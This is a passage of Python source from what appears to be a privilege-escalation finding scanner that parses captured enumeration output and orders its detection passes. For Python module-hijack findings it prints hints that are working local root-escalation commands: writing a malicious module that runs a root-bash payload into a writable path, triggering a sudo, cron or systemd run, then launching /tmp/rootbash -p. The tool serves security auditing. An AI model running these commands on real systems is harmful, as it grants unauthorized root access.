                mod = next(iter(sorted(imports)), "<module>")
                report.add("CRITICAL", CAT, path, _ln(m),
                           f"writable sys.path entry {el} -> hijack a module imported by any root python",
                           hint=f"printf 'import os\\nos.system(\"{_ROOTBASH}\")\\n' > {el}/{mod}.py ; "
                                f"run the root python trigger (sudo / cron / systemd) ; /tmp/rootbash -p")
                _ev(store, path, _ln(m), "python_hijack", "linux", target=el, module=mod, script="")
    for s, fact, cmd, line in scripts:
        if s in seen:
            continue
        d = os.path.dirname(s)
        w_script = ctx["writable"].get(s)
        w_dir = ctx["writable"].get(d)
        if not (w_script or w_dir):
            continue
        seen.add(s)
        mod = next(iter(sorted(imports)), None)
        mod_txt = f"{mod}.py" if mod else "<module it imports>.py"
        trigger = {"sudo_script": f"sudo {cmd}", "sudo_setenv": f"sudo {cmd}", "sudo_row": f"sudo {cmd}",
                   "cron": "wait for the cron run",
                   "systemd": "wait for the timer / service restart"}.get(fact, "trigger the root run")
        setenv = (f"  |  SETENV variant: sudo PYTHONPATH=/tmp {cmd} with /tmp/{mod or '<module>'}.py"
                  if fact == "sudo_setenv" else "")
        report.add("CRITICAL", CAT, path, line,
                   f"root-run python {s} ({fact}) in WRITABLE {'script' if w_script else 'dir ' + d}: "
                   f"drop {mod_txt} there (script dir is sys.path[0])",
                   hint=f"printf 'import os\\nos.system(\"{_ROOTBASH}\")\\n' > {d}/{mod or '<module>'}.py ; "
                        f"{trigger} ; /tmp/rootbash -p" + setenv)
        _ev(store, path, line, "python_hijack", "linux", target=s, dir=d, module=mod or "", origin=fact)


# ═══════════════════════════════════════════════════════════════════════════
# entry point
# ═══════════════════════════════════════════════════════════════════════════
_PASSES = (
    _pass_groups,        # D3-08 first: ctx['uid_groups'] / ctx['user']
    _pass_writable,      # D3-05: ctx['writable'] (whole file) before every "runs X" pass
    _pass_token_privs,   # D3-01: ctx['shutdown_priv'] for service restart hints
    _pass_win_services,  # D3-06: ctx['services'] before D3-07 / D3-09
    _pass_dll,           # D3-09: ctx['win_paths']
    _pass_unquoted,      # D3-07
    _pass_sudo,          # D3-02: ctx['root_cmds']
    _pass_suid,          # D3-03
    _pass_cron,          # D3-04: ctx['root_cmds']
    _pass_systemd,       # D3-12: ctx['root_cmds']
    _pass_python,        # D3-16 consumes ctx['root_cmds'] + ctx['writable']
    _pass_uac,           # D3-10
    _pass_listeners,     # D3-11
    _pass_mysql_root,    # D3-13
    _pass_ssh_keys,      # D3-14
    _pass_tmux,          # D3-15
)


def analyze(path, report, store=None):
    """Full-text privesc evidence scan of ONE file (no 64 KB cap)."""
    if filters.is_doc_file(path):
        return
    text = filters.read_text(path, max_bytes=4 * 1024 * 1024)
    if not text:
        return
    if "\r\n" in text:
        text = text.replace("\r\n", "\n")

    # O(log n) line lookup: a per-row `text[:pos].count("\n")` is O(file) and
    # a 6000-row `ls -laR` capture in a 4 MB file took 7 s per pass.
    nl, i = [], text.find("\n")
    while i != -1:
        nl.append(i)
        i = text.find("\n", i + 1)

    def _ln(m):
        """1-based line of a match object OR a raw character offset."""
        pos = m if isinstance(m, int) else m.start()
        return bisect_left(nl, pos) + 1

    ctx = {"writable": {}, "uid_groups": set(), "services": {}, "win_paths": set(),
           "root_cmds": [], "task_targets": set()}
    for fn in _PASSES:
        try:
            fn(text, path, report, store, ctx, _ln)
        except Exception:
            # one broken shape must never abort the rest of the scan
            if os.environ.get("SECRETHOUND_DEBUG"):
                raise
            continue
